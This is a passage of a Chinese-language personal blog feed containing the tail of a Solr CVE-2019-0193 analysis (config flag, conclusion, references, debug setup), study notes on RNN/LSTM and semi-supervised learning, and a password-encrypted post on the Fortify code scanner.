alt="image-20191103202031725"></p><p>即dataConfig参数必须要dataConfigParam_enabled为True时才能使用，可以在配置或启动命令中设置<code>-Denable .dih.dataConfigParam=true</code></p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>8月份的一个洞了，一直忙到现在才看，本身漏洞不复杂，但其中附加调试和找javaWeb入口点的技巧值得学习。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><p>CVE-2019-0193 APACHE SOLR 远程命令执行漏洞分析， <a href="https://kylingit.com/blog/cve-2019-0193-apache-solr远程命令执行漏洞分析/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p></li><li><p>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p></li><li>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析， <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;先到solr上下载jar和src，这里选择的版本为v8.1.0&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&lt;/a&gt;&lt;/p&gt;&lt;p&gt;运行远程调试&lt;/p&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;anemone&lt;span class=&quot;meta&quot;&gt;@ANEMONE&lt;/span&gt;-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-&lt;span class=&quot;number&quot;&gt;8.1&lt;/span&gt;.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ cd server/ #一定要再server下运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;anemone&lt;span class=&quot;meta&quot;&gt;@ANEMONE&lt;/span&gt;-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-&lt;span class=&quot;number&quot;&gt;8.1&lt;/span&gt;.0/server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ java &lt;span class=&quot;string&quot;&gt;&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot;&lt;/span&gt; -Dsolr.solr.home=&lt;span class=&quot;string&quot;&gt;&quot;../example/example-DIH/solr/&quot;&lt;/span&gt; -jar start.jar --&lt;span class=&quot;keyword&quot;&gt;module&lt;/span&gt;=http&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Solr" scheme="http://anemone.top/tags/Solr/"/>
    
      <category term="漏洞分析" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>RNN学习笔记</title>
    <link href="http://anemone.top/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-RNN学习笔记/</id>
    <published>2019-10-24T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:06.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>普通神经网络不能考虑之前一个单词对下一个单词的作用，即上下文，因此引入RNN。</p><p>RNN在中间层加入了memory，在每次传播后，将中间层输出存储到memory，在下一次传播时，将结果取出与原输入一起作为输入，之后再传出到下一层。</p><p>以下图为例，为了方便演示，将激活函数全部变为线性，并且权重设为1，假设一开始，输入矩阵$[1,1]^T$，那么会输出$[4,4]^T$，同时两个记忆体由0变为2（因为隐藏层的输出是2）</p><a id="more"></a><p><img src="/ml-RNN学习笔记/image-20191024154745435.png" alt="image-20191024154745435"></p><p>那么接下来，输入矩阵$[1,1]^T$，这次虽然输入是一样的，但是由于memory不同，而memory也是输入的一部分，因此隐藏层输出为$[6,6]^T$，最终出$[12,12]^T$</p><p><img src="/ml-RNN学习笔记/image-20191024155107906.png" alt="image-20191024155107906"></p><p>因此输入个向量序列后，大致会执行类似下图流程</p><p><img src="/ml-RNN学习笔记/image-20191024155320413.png" alt="image-20191024155320413"></p><p>可以将其变形为深度学习模型，即存在多个隐藏层</p><p>同时，其有如下变形</p><ul><li><p>Elman Network: memory存中间值</p></li><li><p>Jordan Network: memory存output值</p><p><img src="/ml-RNN学习笔记/image-20191024155515493.png" alt="image-20191024155515493"></p></li></ul><h1 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h1><p>同时train正向和反向的神经网络，结合两个网络的output结合得到最终output：</p><p><img src="/ml-RNN学习笔记/image-20191024155601826.png" alt="image-20191024155601826"></p><h1 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h1><p>如下图所示，对于记忆体增加三个闸门：</p><ul><li><p>Input Gate：控制其他神经元能否写入记忆体</p></li><li><p>Output Gate：控制其他神经元能否读取记忆体</p></li><li><p>Forget Gate：控制记忆体是否该格式化数据</p><p>因此该神经网络有四个输入，一个输出，是否开放Gate由网络学习得到</p></li></ul><p><img src="/ml-RNN学习笔记/image-20191024155929389.png" alt="image-20191024155929389"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RNN&quot;&gt;&lt;a href=&quot;#RNN&quot; class=&quot;headerlink&quot; title=&quot;RNN&quot;&gt;&lt;/a&gt;RNN&lt;/h1&gt;&lt;p&gt;普通神经网络不能考虑之前一个单词对下一个单词的作用，即上下文，因此引入RNN。&lt;/p&gt;&lt;p&gt;RNN在中间层加入了memory，在每次传播后，将中间层输出存储到memory，在下一次传播时，将结果取出与原输入一起作为输入，之后再传出到下一层。&lt;/p&gt;&lt;p&gt;以下图为例，为了方便演示，将激活函数全部变为线性，并且权重设为1，假设一开始，输入矩阵$[1,1]^T$，那么会输出$[4,4]^T$，同时两个记忆体由0变为2（因为隐藏层的输出是2）&lt;/p&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="半监督" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
  <entry>
    <title>半监督机器学习模型学习笔记</title>
    <link href="http://anemone.top/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-半监督机器学习学习笔记/</id>
    <published>2019-10-23T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:17.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>半监督（Semi-supervised Learning）即输入小部分已标记数据和大部分未标记数据进行学习，以提升准确率的一类机器学习方法。</p><p>有两种用法：</p><ul><li>Transductive learning：无标记数据就是测试集本身</li><li>Inductive learning：无标记数据不是测试集 </li></ul><a id="more"></a><p>之所以有效果的原因：未标记的数据的特征是有价值的，例如下图，未标记的样本分布决定SVM的超平面怎么划：</p><p><img src="/ml-半监督机器学习学习笔记/1571834496021.png" alt="1571834496021"></p><p>但是这也不绝对，因为如果左下的数据点时狗的话那么平面就不是这样了，因此半监督不一定效果好，其关键在于假设是否符合实际。</p><h1 id="Semi-supervised-Generative-Model-生成式方法"><a href="#Semi-supervised-Generative-Model-生成式方法" class="headerlink" title="Semi-supervised Generative Model(生成式方法)"></a>Semi-supervised Generative Model(生成式方法)</h1><p>先给出初始值，接着计算无标记数据的$p\theta(C_1|x^u)$，再更新模型的$P(C_1)$和$\mu$，反复迭代直到算法收敛</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024110951281.png" alt="image-20191024110951281"></p><h1 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h1><ol><li>用标记数据生成模型</li><li>用模型预测未标记数据</li><li>将部分预测的标记数据从未标记数据中移到已标记数据中，再回到第一步，这里移动的策略需要自己决定</li></ol><p><img src="/ml-半监督机器学习学习笔记/image-20191024111124407.png" alt="image-20191024111124407"></p><h1 id="Generative-Model-amp-Self-training"><a href="#Generative-Model-amp-Self-training" class="headerlink" title="Generative Model &amp; Self-training"></a>Generative Model &amp; Self-training</h1><p>Generative Model对未标记数据属于哪一类不是确定的，而是一个可能性，而Self-training对与未标记数据会给出属于哪一类，非黑即白。</p><p>对于神经网络来说，Generative Model不适用</p><p>对于直推学习来说，Self-trainging不适用（因为未标记的数据本身就是需要预测的，第一次已经能给出结果）</p><h1 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h1><p>Self-training的优化版，使其适用于神经网络，其思想是认为，如果$y^u$的分布较为集中，那么分类效果比较好，而若$y^u$分布不集中，则神经网络效果较差，因此再损失函数总增加E的度量，E为Entropy，表示了分布是否集中 </p><p><img src="/ml-半监督机器学习学习笔记/1571835087936.png" alt="1571835087936"></p><h1 id="Semi-supervised-SVM"><a href="#Semi-supervised-SVM" class="headerlink" title="Semi-supervised SVM"></a>Semi-supervised SVM</h1><p>枚举未标记的所有可能性，最大化margin和least error</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121420642.png" alt="image-20191024121420642"></p><h1 id="Smoothness-Assumption"><a href="#Smoothness-Assumption" class="headerlink" title="Smoothness Assumption"></a>Smoothness Assumption</h1><p>假设：如果$x_1$和$x_2$相似，那么$y_1$可能等于$y_2$，更准确的说，$x_1$和$x_2$在同一高密度的区域的区域上，那么它们可能一致（感觉很像基于密度的聚类算法）</p><p>又由于未标记样本的特征可以填充密度，理论上是有效的。</p><p>因此具体做法：先聚类，然后再Label</p><h2 id="Graph-based-Approach"><a href="#Graph-based-Approach" class="headerlink" title="Graph-based Approach"></a>Graph-based Approach</h2><p>将$x$视为点，在点之间连边，构成图，如果两点之间可达，那么认为两条数据是相似的。如下如，方块和三角虽然距离很近，但是由于它们不可达，因此它们不相似</p><p><img src="/ml-半监督机器学习学习笔记/1571836705037.png" alt="1571836705037"></p><p>有些时候，这些边是现成就有的，比如说论文之间的互相引用，网页间的超链接。</p><p>有些情况下是没有的，只能通过一些经验来构造边，比如使用k近邻，e-近邻（推荐），如下图所示，距离推荐使用Gaussian Radial Basis，只有靠近的点才会符合要求</p><p><img src="/ml-半监督机器学习学习笔记/1571837008739.png" alt="1571837008739"></p><p>该方法的优势在于赋予了标记数据“传染性”，其可以延边传播到所有类成员。劣势在于未标记数据要足够多，否则无法传递。</p><p>定量分析smoothness：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024115845979.png" alt="image-20191024115845979"></p><p>另外$S$可以通过矩阵运算得到，即计算L, W为图的邻接矩阵，D的对角线上的值为每行的和</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024120650988.png" alt="image-20191024120650988"></p><p>在神经网络传播时，将S乘上权重$\lambda$加到损失函数上：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121139659.png" alt="image-20191024121139659"></p><h1 id="Disagreement-based-method（基于分歧的方法）"><a href="#Disagreement-based-method（基于分歧的方法）" class="headerlink" title="Disagreement-based method（基于分歧的方法）"></a>Disagreement-based method（基于分歧的方法）</h1><p>首先提出多视图的概念，即一个数据对象在多个方面存在多个数据集，比如电影，就存在图像画面的数据集和声音的数据集（两个视图），因此对于多个方面（视图）建立多个模型。</p><p>多个模型间可以展开协同训练，即先在每个视图上，使用已标记的数据训练出分类器，让每一个分类器标记未标记的数据，选择最有把握的未标记样本赋予伪标记放入训练集，再将新的训练集给另一视图上的分类器训练，直到分类器结果不再变化。</p><p>该方法经过改造，可以用于单视图，仅需不同分类器就可提升效果。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p></li><li><p>周志华. 机器学习[M]. 清华大学出版社, 2016. </p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介绍&lt;/h1&gt;&lt;p&gt;半监督（Semi-supervised Learning）即输入小部分已标记数据和大部分未标记数据进行学习，以提升准确率的一类机器学习方法。&lt;/p&gt;&lt;p&gt;有两种用法：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;Transductive learning：无标记数据就是测试集本身&lt;/li&gt;
&lt;li&gt;Inductive learning：无标记数据不是测试集 &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="半监督" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
  <entry>
    <title>Fortify使用初探</title>
    <link href="http://anemone.top/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/whitebox-Fortify使用初探/</id>
    <published>2019-10-23T01:27:49.000Z</published>
    <updated>2019-11-03T13:22:18.427Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码，查看文章" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="166884b884b5f6b4233b62798f94acca80a93f95dfc551a7894d0d3c0282bca9">24cf14f4c89eafae7f6aaf5c3fd0468f66f766e30cbff21d883f6babf33f9f1899ce479d339500dd34001d6cee5f66baf25939a44680530e72967798b6d170f0860eb651aa175d850bc0252ce840dce1082a56fd55371edb5723339365ba85dc252af5d208f1c72bbe88d10f819137034f0e0334a7627a1ab4bc9e742d12bc24c2ef5c347dd91df4c0a3ae41faf911eb79a1d5cd5d5fcc0a35793ae220a23c658f79d47d30be438e95b3fe5c317c5c0bfdc1743a9d3861c3bc94f9bb6caadaedd43d3215fbd4ba3c6e556610dd33834acd38034981fd141c7dcbec28cf90b72de1a621dd3918341380994b25b3d16b7b20c698c408950f2afe47529dc4fb8bfd381ab6c670f3da985841153ef1fa781716bc5a78ca5965b2ebf8d448072fba53be10fbaf92e10148a6c2caba9d18e370eb65acfb4e39ba946c7e52a0938fc31a357776b98f72a303f9ffaa796944ce6fcc1d789eff50d2d857737b4b96a5832634a26afaf13b7c3595dcf83380e49b4d38f44ceaff5a48af492cb351a132b8f773b6040fc7b6a76d94cf9320a189e3667c68e902ab83a43670c6d1c6c100ad0789083ec7c6db930990e2599bb6c17df5ab52d1f3a2dbe5f71556471ab1f4f6bfa660d4b48ef7e22d69fce901fc77346f7131305894f60f9f13dd4c94315c1469c84c25b6611985cc0775e3f14e5424ecd73d7f95afb38497f788ac1548fac2213b2ab142baebda2867f2bd2a8c0cecc4ab09d82e283f99bc6967d51605a7c3bb2dd4630005803d94a66a7e45fccb96fc2862b70572d94cee0ecfef1ba4a432cddd6d77841e3ac46b30f04db36d96782013dcff1ecc4c50c0127e9a17128de5080afa99fc825f42ed3eab9432f85bc571e2431faf7df36f5e30381e34f8760318fe3bc512f1f0a77a68ab1fc11405a12af399c0e4944089709b3f5c29f8b8897ca58386177ab054ef32152aad698b15b1f49f7471b83967c9b6414123feae701bbe7d3a13ba4b91529dd85e1cac2707c17a2ce5852775617c5c9a74113ab339f1c9053d9e8d8061511c645fa868b44952884e052d603e165d9c8363d6b5e872e45da98d8441ee3ac7c41ca5569ddf19a1b382a6cacf9d2d8f5861ec06d4f5a82ca01acef88eafc3cc7ae57abf18724d15bbe46da5761856bfe9523f27da1ba4ec428bf62b2a27e97b33db8b1994c6475957e8389b1a0cb83a77ff1aafea695497e17fdebc4fb489d91a5ee1696f47db8677553815c40c157d5cbd21130b5562bb3f075ac9075612a77d866a5cab5f681264af0af5cc496e0abb7bb16b01f323fe8ce187aa610f74d6cbf92145ade6b0307318e028d3df82f02ba25327147ffb498c2b43c087c9c52e429c9aa988e375009e90e70ad8e67a344108c842e4c995cf51253c976136a4dd217488b5637afdff657985543648a736061d0377dea1db89a8a1f70ef2a03a077806695d4a4b613e8494731d9afa7fe6c430f80167f4659ba132a45e2e1e5ed68119acc51b8e3152f81709a4bb30ef60dbd2a6318b2ee80bdd7d6b83a7c4b9e4e8897c7eb94666cf93c6f730c2ec4198182837fe8e7bb3604691fc74cb5c4a2c060d83dc986d81822e85609b4e77ca78adb7a189dccce6ce6385e1fe90ef59510826bd8a27bc128347468becba673e5ccbdd18cd19aa9d690389533248a684c84593c84a0be96a4fe82bf368480a52c1ee6894e9dedd943b1fe7c253a462706f92cc84ad82129e9cf894bedda5b62ce62ee0dd836166e1fda93576c8bd2c11622bb10740d5b02c979c4e21126dba113ebf63e89f3ad39d73ce83ef479ba37cfda80fb8960273837b6c86a734a23dfe8c67597e5f116a4893bd94cf2989223bf486f0f4cba698941ac286786d6a504f7b6992605e60e12bbddb18476422c0b73fbcbf5682dd9a65704423a03714a369f59f23558d0b19a6c9f2d3a9e8c74cac62aea4483e02f8e289ed89b113cff8fde59c6650a75adee31ce3043f061336d9b767511b593d6c5f838d92c58007bb0d2424990c255988e2fdfb640a2b05fceda8a1416953e9c2b865d153a2a74285615799bdbf4961894f0997f006a15e82ad32fbeb71284b149677ef9b883c63edd39a6d78ed248c43694122319343c7bd190bee5915821fe49483664a2045881c88647e38124b72b44072bffbc409f482ac12d2428e7e1c24ba3fd49d560cdd5e599c160b7d245ad4eb9e81e7a58fa4b791cdd6d976493a708d4d136d6a6e7a68ec94f526970520e5913a44ea363dd9546b024b4ea09a32d7099bf5d7901376171aadcedb5be6f8ef5953038af0497c02ff46a4758f12c1da311a664be4a326825dfa643b2388e58959a651be269d06e738857483845017eaaf5027c93ec40493852042f315b96a33904adcac475af60669e8e0915b09e7fcee581eb77cce60b0f00b501e10d0b30d59aa7cf3928ef3e816eb84b0d542e3fa1f634e8e503d10dd025520aee7a093d6fd9fd87cebdb914f25743bc6175f14ffd826d2609a69c6fe996092daeb7dd16141920da1b90516007b294fc5edf873e2023241936ce457c3c215493feb546cb60369a11c17739b3be97eba420b868586f0777699f2e25473b83552993ef8f3710d4e12856b3af429e3a3cf139b5ef510238d8c9623230df46405dbde1e86b64e444818489d1df854bdffaf3c87afa724604c7346f16823d9f15866fd22afd6e77ab8ec1acec8fe2c63d490254bedf764afbac639c9f5f32d66152df9c1001eea08c7b663fb8e3c251641832e462fdc180f6ebe21978dacba83987ede5a1cfd641f0f801b7cb461f003d687222e09e45e911348291f7d5c0edf8eaad40ce12b37794b89749e71948affccdb41393fb2aa23bd53d60a33b6b72c954dbd27ce16ccc6be082f55945a3b6600cf2e8e5f023ac04dc14454ec8050ec5afbde6d7b90673a0b2b7a5291636ab0cd5df464e9b1ce5dbffc28b0d8d0d896179af95dce76f74c016b34ae35dbc2d3171c052ebf355fe0f08f44ba2ed3ac0e0ab23092ae259f42b3af82db2c5354af7129f19dde39915e8f5e3ee8f6afbf29ebc03fae244b6fdde3d78d78cae3023ac2e22f8d00f02489132f9a095aec60ab324a5f1917e43a48b16fbdfbd052b8799c61fb1d2d5359763712d1332e5e60f5ef56686d44bb3c8eaa540f409d0e2567cf96382fa1a1a8b80c4130632d0e6f541b595356d2b98b992e60ad21c5dac64397267711ac6f12dbaa4f5c6a37f3ead465feb8d767817d949fa5ae7d0039a35b55416ede0e29fbfbbec3acdb1140b30c2758efab9ab503adc1cdcd69e1a319e6a33a92e4fa9426525b367c4498f5f850295a819703e9b4a8117be891ce1e0c7446e6d1c64d5582158606fb070dcaefbd2b556d73275c8411283bbbf12f673f1d95ef6ee47eca569b238755a0dada60e95b07b239104f5c5a6b365200487b6be1ddf5c8f93a8177d8bd2304cf69ecd24a00477505fbbfedb1070b1749b9fa4a9269ca9001934786b00cfea9fee3bfc656e781099e4a13f34aed3da3ec78d20f97417d1c842926b6f5c9c9b5c44ea6db892bbb5705bde6ca86327175e7f967d72be79d97805b81f64b657fa217d2f00c897b85387507451143eeb7582dbcc9253cbcb70e705cf3f37ebcb20785502c1397aba50995d34903f93304230f6fa9e18540e16df296fe85051887b37900a8e43a0a586d6210d0c77bd13afa0ed71e0af72ab83228c586636bdbe8602fa65175e8d700aa9045cdcf1ad8cf3fb42918e5b2e56c8819bd06a578a79f55f14fe01e65171c470b78b0952b98a91e0bd452b8213520a74f11812c50d1c1cf63841bf631f369b4e7e27cd5b48ebf188cd231c497fdf61d8ecc3ffb094971eac7127c38e7ec428048bcfe7f6aa8994624e8873bae4caffb81af0c0aa602a091c9792893e8e749d902cd75bbb804131b7bd6e9f6be139b79826d633851eff2f0eca9dbf1ee3db6fcdb4a189b74cf3711600eae5b24b2f6b74d39779cd77352a622500064de38a4c215ac030ac2a25669e6e38131baa35214fb710b12056e36befca82651f4e97113c26d0a723905de0bd377e11bc4f39f77b48e38c864b0860c9d9369fcfad7ab53fbe8412fdd25de6bf77569a595b212b708c837fa547b845a30777a3cb61558573a7acf199a81af9cbaa2d9d96dc2e11c959e579237da1cac884edbf635bdd36490134b6f29ece928b2795eb48ada40ab9d19994a37db6125bc0f480d062c24456df5a3c0f0928f5bcd9dcac98cd8df38f031210be64d08de901740c86ef9b01c8c0d1dd5eda779eb31be7067e1031ba107646b422b2517f91a43f7acc5374802274913d730fc9782b3b2b3c4a3052dd14539cceeba3a48e4afb0514d6666856f75b9761f3559e75140d867844078c8ee606c4c6ec10f12b3568014ac8eeda76f7b2b65673c7cff65f817426667623e5c24c2c0859f5a7e3f60a1d54b2578761fe5233e29c3153c98ee1547f6a189ba4637d4eb447d8a08f23dcb20e3ba7ed381e864d017156dc2eeb5bd678ea07a91e54c282af93a38a4b19e81848221e6676c94e70205e9022b33f8273cc9ac922179eb8b482f88a501af5f4089e15bf07605b91c2ebb86e8ed0ccb7556c40e24e1b066f66c1c972d93a9a00b6dad1de012b8e6bc3ae93c225a3ca4730393475d1b4d68d09fef97dd786945e095eada99fa74b978fe6687285ff849422d9e42e2e650bcc03af1c93d18dd9f1756f1bbc48f40271549d1c672d9abf10c3f2aa3486fedcfb4cb56319c627f43130818233ee1e430056fd5b4c878378b94b8d1d8d3f7c7258c1a9e4380af9e1f11de807e6da3ea4c99b7ef77cbab1cd1348096c0a3b6e3085e7a03e676cb4feb81f5089c288c25d6e990302d3c47b104345e01064e19ec13f66d0aff31901a85814e46c82e1138485f6d870a485ce364b2baa5764155e2356cfa316a5630e76103e6499cc5018a4e87a6ee03dfde6ba5792dcb6584aece93c25ee1037743416156a667c27e53ab868d639ecc5ccc1ca3ed66eeb77283581cebdf35aafd5d348d3a41ab2a6289be102d2a34f6268c5101eb8dd70937626b3a858f66cdee1da0a98d7ef91a354884e7dc6174826e09d463fd844b7ceb9a10641201d41b1b94c9fd53e166936d15abe3b558628552e2ec16ce3efcb79b8310e8e1c8df94edea20dd9b256694443d0c9f0690d33d2334da1a4ece94e6c57a47cede903d78934f00cc1bf2403d5de6de707de1c63ebe9d49f18f4faa65505cc9490fe3de8bfffad3a4afb405ebb7449f834a57df918d7fbacd03b761ab8b4f63e045abf7b3e9424e10d7893a9d3485f50f6c53313c66d7f4f05840e143f1d52c57dd58c1ac9e7c12010fb321d047acd1c553fc2160228556680c213cc2f6a0931a022af0929e85a768f06185ced5fe8032e802edb381e271398f3d63fd04acdc6052f42f5893ff6058329784fb8a4e09fa0420dab8c8060a77754bfe0bda37537b71557d39b158bd758f8401047d50a7a5b860e825f2788980fa0bd3b3aaa7bc3ea71d4f094a14ab9cfe14ef87b221be69bb180f3ffc7bbc7c37cd24a1342089cbc9cb8d9aef8ef81d4c05cba976be83ce04ff51187bd7c4fc9e73059af1f27c5c527a4905e329ff6ac233568dbdafb4b34b786a05664b7c313a4ca3c2f0d8afccc6382b5b09fd431c293fe67c2c17804eca23ddad21e0cb16f4efcf9c2b68687f35042ad879f24e95bebf8e32d461efdf73d8dc6a0c9e23c866b525b78aa5386017f5987181aa3c1782b31e7a89ffb20d0127e86aaf54f4e0d8b7db4c1f42b18dd3441b20021963a448edd264ca31d5f6cd690802f4b507f3727a0a0660e17f067f689a0420bb3f5dc1db2ae68c144a3316ba349ec223144e4826033674631fb08093e3f67ed23d8f606a1231ceee0afb1ecf67bddd7443e673c8fdee258ff7b230091462900904c2f8a223cc1b24260300acfed846a511ac6d7c62d4c08e7f20c872959ebfcafcc9e700f48b618172d1ded60e170cade945d4d92b15bd3660c9eed73a0d4eb082420599d3fd1620cff6dfe63896f45a6dcef1b75852391f8ebbaa6a7987e921c1daf06f97829c6a55d306380169e7c3e66f019a6b575588af35597d45ef3cff07b9ebafe25f12ca28460ac00b65a858035b2777ce44912920633996665dd292d05b6c945e657cf81ca268021e0b58fe01e7302bdc747947241111f1d395c612a82ec5c32accd763e6c25afe808ec44912d5a9135d8e2d143ce1328b7d2863243a547ef3adb274c50de5ea6f000e924487087665b3348a27ff0ac21fec43c5441230e294b344e8ebdfcd4dbfab8ca5566eb0b5079093c6adf1f5084b0ded0f14aacef8ed58582e16dd7b0d927b44a85c774f51f7ed259027dac96b5bcef0fc419887ebf1387848d8feb6f31cfa3a36bfbe26b4bdfcb209ea0ac3e43c68b1329a18ffc036a648f0a2bd6dd5adb0405708f90b122ae201b02a5c9266a3d36e30ae4599e2997c1e38ae11cff332ab92555ab84c64aa389a6859ff234433c8c55062e10bf1f32671a23a1445bc8f247fe1d4829cf6b21b518d5bf1a14c37da83e1e219d6912eb7c30bcd7909a8477e5a7bfad8a8597d86db9690b3195edbb7d44c358872ea16b053f516353f44440899eb481c512456866ff1e4facaae2ab99cfcfaf2689f46cf11957896545fdaabcb7280def662f1be6b126cfbe433b45a1f5089dffdedafee1872392983daf569a657982f897fd359f0148b5489fd124f196c03945cea201b1d2927c7154a588c6d868fe3415417202d3b2b44497424e4b8f7ee2def7905793b3d74849aa9aaf82a17067d315969b8d8e561f210a44d2758d8b8745d7d2132b2c2907d1b908c1c8f6fc721d42fa3bee1bd745ef5ddb9526b1701941f956dfe5790d677c4346fe160c115d6d4ecf90255cb4539cdb3c38b5d3a6567f1c22547f7e60b78b75dbfa49dafd69cf395939c62a4dd5d401c7d0149f4d0837cec965d85f4aed56aa0eebc07a041752165a511d3de82e412fd70539d91b87b46b2d31330f82d90423afe0fd8acd14dc46fd8932f93d63c2234b20f200744db1a92dc475025d849b50ddf755cd93f8451a49599632b5e512076b21d54774d201d9417e459ec8fac2622a2daa61a45bb67bf853f263a17c70f14c477edd4cbdfcff775f7407c1057b3f993e1267238bd4e0dcc99ef05097c6c059f7b46aa400963bcc6805187431543337fe6098303a02adac1959907737a96e57c1cae254b590156a67a3469ed43c979c506a40ea999d659c0a4a79fcbc653c8343c9004843f2956f3e4733c419b9f35fa2ef73b29a29bff23cefdc